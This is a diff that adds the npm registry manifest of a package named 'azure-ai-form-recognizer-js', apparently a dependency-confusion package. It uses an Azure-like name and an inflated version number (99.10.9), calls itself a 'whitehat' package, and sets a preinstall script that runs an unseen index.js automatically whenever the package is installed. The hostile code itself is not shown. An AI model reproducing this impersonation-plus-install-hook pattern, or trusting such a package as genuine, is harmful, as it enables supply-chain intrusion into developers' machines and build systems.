@@ -1,0 +1,39 @@
+{
+    "name": "azure-ai-form-recognizer-js",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "azure-ai-form-recognizer-js@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-QRBhLzlteksPpcBKuH7IhT3tc9mal/It3fzV5smGi//fbNClEb9kYjX9Zu4UZPmmCoHrlwAp65ezs2KeDe506w==",
+        "shasum": "0b560a74247aa77f220c30c3b9730d16f1e653fb",
+        "tarball": "https://registry.npmjs.org/azure-ai-form-recognizer-js/-/azure-ai-form-recognizer-js-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3591,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhoSnXCRA9TVsSAnZWagAAfFIQAKUIKwsiHcxRF0IOaMRB\naBq3VYUuxbI80Rz2iw5QIIIBVN9f2Ui6Cb6CfJijKxXiKwtsXUkR85L7AvHm\nvOTNnSAZXRLyyCsXOfk9qyTyVyqH+yygp/bhf6bKULzMbN/ysDN3miLd/mUi\n1L4H+CRqCN6SzzK7+GW53xejHJDdWjSRw8jSGieaTAhIz0je2M0BMh9RzBGg\nrkeplCIr5ydXOmI2ExkTC5IhKHu21GUsyb4gh7xt3liPBORTlOERLRmrEfKb\nQ8Wzjrk0FaJp+MsssQQe1AZxHwqOeCMSBF1k3SGyU9/kX9jpEcJD0vT5zK/t\n/SATCmwW5sEFjS/PnG3lTkzhDdv3u0titdG81Yw4egXWHjM6N0QqDCyqLTga\nibWC6maJcc442EsUKTVtkA01w1k5Bm59InPoOoBVPL5PM0Gi5oL8Yvy0uXtl\nG8ZPKv8FH3jMB96zMAfXUTNZ+rtcPNY3qZxwRj7B3Kka3C+WHoCsZYUtpRRS\n06ZtksHLrfMFLcYCgGufoBOF18jeT9q03rih9VWF6Fpoa2LtjTlAznbVQMjq\nBK+iLa72PYC76JhHuI3aKqIb//Drp/I+fXFhEpmH724xSRtT5++TloEWBpQE\nwPS41pHLjp8mkTYI0n88VJPw5d1fgEiT6fOPCFbhOhJgLn3Eb5gmQkrkkVRv\n27pu\r\n=TGM9\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "azure-tests",
+        "email": "hussam.tes08+3@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "azure-tests",
+            "email": "hussam.tes08+3@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/azure-ai-form-recognizer-js_99.10.9_1637951958949_0.641247088190777"
+    },
+    "_hasShrinkwrap": false
+}
